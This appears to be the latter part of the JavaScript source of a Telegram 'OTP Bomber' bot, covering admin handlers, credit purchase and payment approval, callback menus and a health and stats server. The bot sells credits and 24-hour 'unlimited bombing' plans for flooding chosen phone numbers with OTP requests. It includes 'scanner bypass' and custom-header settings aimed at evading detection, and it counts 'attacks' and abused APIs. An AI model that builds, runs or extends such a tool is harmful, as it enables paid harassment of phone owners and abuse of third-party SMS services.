            bot.sendMessage(chatId, `✅ Code: \`${code}\`\nAmount: ${amount} credits`, { parse_mode: 'Markdown' });
            userStates.delete(chatId);
            return;
        }

        // ===== BAN USER (ADMIN) =====
        if (state.state === 'ban_user') {
            const id = parseInt(input);
            if (isNaN(id)) return bot.sendMessage(chatId, '❌ Invalid ID.');
            await db.banUser(id);
            bot.sendMessage(chatId, `✅ Banned ${id}`);
            userStates.delete(chatId);
            return;
        }

        // ===== UNBAN USER (ADMIN) =====
        if (state.state === 'unban_user') {
            const id = parseInt(input);
            if (isNaN(id)) return bot.sendMessage(chatId, '❌ Invalid ID.');
            await db.unbanUser(id);
            bot.sendMessage(chatId, `✅ Unbanned ${id}`);
            userStates.delete(chatId);
            return;
        }

        // ===== ADD CREDITS (ADMIN) =====
        if (state.state === 'add_credits') {
            const uid = parseInt(input);
            if (isNaN(uid)) return bot.sendMessage(chatId, '❌ Invalid ID.');
            userStates.set(chatId, { state: 'add_credits_amount', uid });
            bot.sendMessage(chatId, '💰 Send amount to add:');
            return;
        }
        if (state.state === 'add_credits_amount') {
            const amount = parseInt(input);
            if (isNaN(amount) || amount <= 0) return bot.sendMessage(chatId, '❌ Invalid amount.');
            await db.updateCredits(state.uid, amount);
            bot.sendMessage(chatId, `✅ Added ${amount} credits to ${state.uid}`);
            userStates.delete(chatId);
            return;
        }

        // ===== ADD PROTECTED (ADMIN) =====
        if (state.state === 'add_protected') {
            if (!input.match(/^\d{10}$/)) return bot.sendMessage(chatId, '❌ Invalid number. Must be 10 digits.');
            await db.addProtected(input);
            bot.sendMessage(chatId, `✅ ${input} added to protected list.`);
            userStates.delete(chatId);
            return;
        }

        // ===== REMOVE PROTECTED (ADMIN) =====
        if (state.state === 'remove_protected') {
            if (!input.match(/^\d{10}$/)) return bot.sendMessage(chatId, '❌ Invalid number. Must be 10 digits.');
            await db.removeProtected(input);
            bot.sendMessage(chatId, `✅ ${input} removed from protected list.`);
            userStates.delete(chatId);
            return;
        }

        // ===== UNLIMITED PLAN (ADMIN) =====
        if (state.state === 'unlimited_plan') {
            const uid = parseInt(input);
            if (isNaN(uid)) return bot.sendMessage(chatId, '❌ Invalid ID.');
            const target = await db.getUser(uid);
            target.daily_unlimited = Date.now() / 1000 + 86400;
            await target.save();
            bot.sendMessage(chatId, `✅ Unlimited plan granted to user ${uid} for 24 hours!`);
            try {
                await bot.sendMessage(uid, '⭐ **You\'ve been granted a 1-Day Unlimited Bombing Plan!**\n\nYou can now bomb any number for free for the next 24 hours!\nUse /bomb to start bombing.');
            } catch (e) {}
            userStates.delete(chatId);
            return;
        }
    }
});

// ============================================================
// ===== CALLBACK QUERY HANDLER =====
// ============================================================

bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;
    const msgId = callbackQuery.message.message_id;

    // ===== VERIFY JOIN =====
    if (data === 'verify_join') {
        const joined = await db.isJoined(chatId, bot);
        if (joined) {
            bot.editMessageText('✅ You have joined all channels! Access granted.', { chat_id: chatId, message_id: msgId });
            await showMainMenu(chatId);
        } else {
            bot.answerCallbackQuery(callbackQuery.id, { text: '❌ You still haven\'t joined all channels.', show_alert: true });
        }
        return;
    }

    // ===== DURATION SELECTION =====
    if (data.startsWith('dur_')) {
        const dur = parseInt(data.split('_')[1]);
        const state = userStates.get(chatId);
        if (state && state.phone) {
            const phone = state.phone;
            userStates.delete(chatId);
            await runBomber(chatId, phone, dur);
        } else {
            bot.sendMessage(chatId, '❌ Please enter phone number first.');
        }
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    // ===== BUY CREDITS =====
    if (data.startsWith('buy_')) {
        const planKey = data.replace('buy_', '');
        await handleBuyCredits(chatId, planKey);
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    // ===== PAYMENT APPROVAL =====
    if (data.startsWith('approve_pay_')) {
        if (!ADMIN_IDS.includes(Number(chatId))) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only!', show_alert: true });
        }

        const payId = data.replace('approve_pay_', '');
        const payment = pendingScreenshots.get(payId);
        
        if (!payment) {
            return bot.editMessageText('❌ Payment not found or already processed.', { chat_id: chatId, message_id: msgId });
        }

        const userId = payment.userId;
        const credits = payment.credits;
        
        try {
            if (credits > 0) {
                await db.updateCredits(userId, credits);
            } else {
                const user = await db.getUser(userId);
                user.daily_unlimited = Date.now() / 1000 + 86400;
                await user.save();
            }

            payment.status = 'approved';
            pendingScreenshots.set(payId, payment);

            try {
                await bot.sendMessage(userId,
                    `🎉 **Payment Approved!**\n\n` +
                    `✅ Your payment of ₹${payment.price} has been approved.\n` +
                    `💰 ${credits > 0 ? `Added ${credits} credits!` : '⭐ Unlimited Plan Activated for 24 hours!'}\n\n` +
                    `Use /bomb to start bombing!`
                );
            } catch (e) {}

            await bot.editMessageText(
                `✅ **Payment Approved!**\n\n` +
                `👤 User: ${payment.first_name}\n` +
                `💳 Plan: ${payment.plan}\n` +
                `💰 Amount: ₹${payment.price}\n` +
                `✅ Status: APPROVED`,
                { chat_id: chatId, message_id: msgId }
            );

            pendingScreenshots.delete(payId);

        } catch (error) {
            bot.editMessageText(`❌ Error: ${error.message}`, { chat_id: chatId, message_id: msgId });
        }

        bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Payment approved!' });
        return;
    }

    if (data.startsWith('reject_pay_')) {
        if (!ADMIN_IDS.includes(Number(chatId))) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only!', show_alert: true });
        }

        const payId = data.replace('reject_pay_', '');
        const payment = pendingScreenshots.get(payId);

        if (!payment) {
            return bot.editMessageText('❌ Payment not found.', { chat_id: chatId, message_id: msgId });
        }

        payment.status = 'rejected';
        pendingScreenshots.set(payId, payment);

        try {
            await bot.sendMessage(payment.userId,
                `❌ **Payment Rejected**\n\n` +
                `Your payment of ₹${payment.price} was rejected.\n\n` +
                `Please try again with a clear screenshot.`
            );
        } catch (e) {}

        await bot.editMessageText(
            `❌ **Payment Rejected**\n\n` +
            `👤 User: ${payment.first_name}\n` +
            `💳 Plan: ${payment.plan}\n` +
            `💰 Amount: ₹${payment.price}\n` +
            `❌ Status: REJECTED`,
            { chat_id: chatId, message_id: msgId }
        );

        pendingScreenshots.delete(payId);
        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Payment rejected' });
        return;
    }

    // ===== SETTINGS CALLBACKS =====
    if (data === 'settings_view') {
        const user = await db.getUser(chatId);
        const msgText = `📋 **Your Current Settings**\n\n🔍 Scanner: ${user.scanner_enabled ? '✅ Enabled' : '❌ Disabled'}\n🛡️ Custom Headers: ${Object.keys(user.custom_headers || {}).length} modified`;
        bot.editMessageText(msgText, { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (data === 'settings_add_scanner') {
        bot.editMessageText('🔍 **Scanner/Bypass Setup**\n\nPlease send a description or code for scanner bypass.', 
            { chat_id: chatId, message_id: msgId });
        userStates.set(chatId, { state: 'add_scanner_user' });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (data === 'settings_modify_headers') {
        bot.editMessageText('📝 **Modify Headers**\n\nSend header modifications in format:\n`header_name: header_value`\n\nSend /done when finished.', 
            { chat_id: chatId, message_id: msgId });
        userStates.set(chatId, { state: 'modify_headers', headers: {} });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    // ===== SMART BROADCAST =====
    if (data === 'smart_broadcast_start') {
        if (!ADMIN_IDS.includes(Number(chatId))) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only!', show_alert: true });
        }
        adminBroadcastState.set(chatId, { mode: 'broadcast', active: true });
        bot.editMessageText(
            `📢 **Broadcast Mode Activated**\n\nSend any message (text, photo, video, GIF, etc.) and I'll forward it to ALL users!\n\nSend /cancel to exit.`,
            { chat_id: chatId, message_id: msgId }
        );
        bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Broadcast mode activated!' });
        return;
    }

    if (data === 'smart_broadcast_cancel') {
        if (!ADMIN_IDS.includes(Number(chatId))) {
            return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only!', show_alert: true });
        }
        adminBroadcastState.delete(chatId);
        bot.editMessageText('❌ Broadcast cancelled.', { chat_id: chatId, message_id: msgId });
        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Cancelled' });
        return;
    }

    // ===== CHANNEL MANAGER =====
    if (data === 'channel_add') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
        userStates.set(chatId, { state: 'add_channel' });
        bot.editMessageText('📺 Send channel username to add (e.g., @channelname):', { chat_id: chatId, message_id: msgId });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (data === 'channel_remove') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
        const channels = await db.getChannels();
        if (channels.length === 0) {
            bot.editMessageText('📭 No channels to remove.', { chat_id: chatId, message_id: msgId });
            return bot.answerCallbackQuery(callbackQuery.id);
        }
        userStates.set(chatId, { state: 'remove_channel' });
        let msg = '📺 **Current Channels:**\n' + channels.join('\n') + '\n\nSend channel username to remove:';
        bot.editMessageText(msg, { chat_id: chatId, message_id: msgId });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (data === 'channel_view') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
        const channels = await db.getChannels();
        const msg = channels.length ? `📺 **Required Channels:**\n${channels.join('\n')}` : '📭 No channels configured.';
        bot.editMessageText(msg, { chat_id: chatId, message_id: msgId });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    // ===== SCANNER MANAGER =====
    if (data === 'scanner_add') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
        userStates.set(chatId, { state: 'add_scanner' });
        bot.editMessageText('🛡️ Send scanner bypass data (JSON format or description):', { chat_id: chatId, message_id: msgId });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (data === 'scanner_remove') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
        const config = await db.getScannerConfig();
        if (config.scanners.length === 0) {
            bot.editMessageText('📭 No scanners configured.', { chat_id: chatId, message_id: msgId });
            return bot.answerCallbackQuery(callbackQuery.id);
        }
        let msg = '🛡️ **Current Scanners:**\n';
        config.scanners.forEach((s, i) => msg += `${i+1}. ${s.substring(0, 50)}...\n`);
        msg += '\nSend scanner number to remove:';
        userStates.set(chatId, { state: 'remove_scanner' });
        bot.editMessageText(msg, { chat_id: chatId, message_id: msgId });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (data === 'scanner_view') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
        const config = await db.getScannerConfig();
        const msg = config.scanners.length ? `🛡️ **Configured Scanners:**\n\n${config.scanners.map((s, i) => `${i+1}. ${s}`).join('\n')}` : '📭 No scanners configured.';
        bot.editMessageText(msg, { chat_id: chatId, message_id: msgId });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (data === 'scanner_headers') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
        userStates.set(chatId, { state: 'set_global_headers' });
        bot.editMessageText('🔄 Send global headers in JSON format:\n`{"header1": "value1", "header2": "value2"}`', 
            { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    // ===== ADMIN BACK =====
    if (data === 'admin_back') {
        bot.editMessageText('🔐 Admin Panel', { chat_id: chatId, message_id: msgId });
        bot.sendMessage(chatId, '🔐 Admin Panel', adminKeyboard());
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    // ===== ALL USERS PAGINATION =====
    if (data.startsWith('allusers_')) {
        const page = parseInt(data.split('_')[1]);
        const state = userStates.get(chatId);
        if (state && state.state === 'allusers') {
            const start = page * state.perPage;
            const end = start + state.perPage;
            const chunk = state.users.slice(start, end);
            let msg = '👥 **ALL USERS**\n\n';
            chunk.forEach(u => {
                msg += `🆔 \`${u._id}\` | @${u.username || 'no_username'} | 💰${u.credits}\n`;
            });
            msg += `\nPage ${page+1}/${state.totalPages}`;
            const markup = {
                inline_keyboard: [
                    ...(page > 0 ? [{ text: '◀️ Prev', callback_data: `allusers_${page-1}` }] : []),
                    ...(page < state.totalPages-1 ? [{ text: 'Next ▶️', callback_data: `allusers_${page+1}` }] : [])
                ]
            };
            bot.editMessageText(msg, { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown', reply_markup: markup });
            state.page = page;
            userStates.set(chatId, state);
        }
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }
});

// ============================================================
// ===== HEALTH CHECK SERVER =====
// ============================================================

const express = require('express');
const app = express();
const port = process.env.PORT || 10000;

app.get('/health', (req, res) => {
    const mem = process.memoryUsage();
    res.json({
        status: 'ok',
        uptime: process.uptime(),
        memory: {
            heapUsed: (mem.heapUsed / 1024 / 1024).toFixed(2) + 'MB',
            heapTotal: (mem.heapTotal / 1024 / 1024).toFixed(2) + 'MB',
            rss: (mem.rss / 1024 / 1024).toFixed(2) + 'MB'
        },
        activeBombing: bombingStatus.size,
        totalAPIs: uniqueApis.length,
        qrCodeSet: qrCodeSet,
        pendingPayments: pendingScreenshots.size
    });
});

app.get('/stats', async (req, res) => {
    try {
        const totalUsers = await db.User.countDocuments();
        const totalAttacks = (await db.User.aggregate([{ $group: { _id: null, total: { $sum: '$total_attacks' } } }]))[0]?.total || 0;
        const totalCredits = (await db.User.aggregate([{ $group: { _id: null, total: { $sum: '$credits' } } }]))[0]?.total || 0;
        const protectedList = await db.getProtected();
        const channels = await db.getChannels();
        
        res.json({
            users: totalUsers,
            totalAttacks,
            totalCredits,
            protected: protectedList.length,
            channels: channels.length,
            apis: uniqueApis.length,
            activeSessions: bombingStatus.size,
            pendingPayments: pendingScreenshots.size,
            qrSet: qrCodeSet
        });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.get('/', (req, res) => {
    res.send('🤖 Telegram OTP Bomber Bot is running!\n\n' +
             '📊 Health: /health\n' +
             '📈 Stats: /stats');
});

app.listen(port, '0.0.0.0', () => {
    console.log(`✅ Health check server listening on port ${port}`);
});

console.log('🤖 Bot started successfully!');
console.log(`✅ Loaded ${uniqueApis.length} unique APIs`);
console.log(`💰 Unlimited plan cost: 100 coins`);
console.log(`📸 QR Code payment system enabled!`);
console.log(`💳 Screenshot approval system enabled!`);
console.log(`📢 Broadcast system supports: Text, Photo, Video, GIF, Document, Audio, Sticker, and more!`);
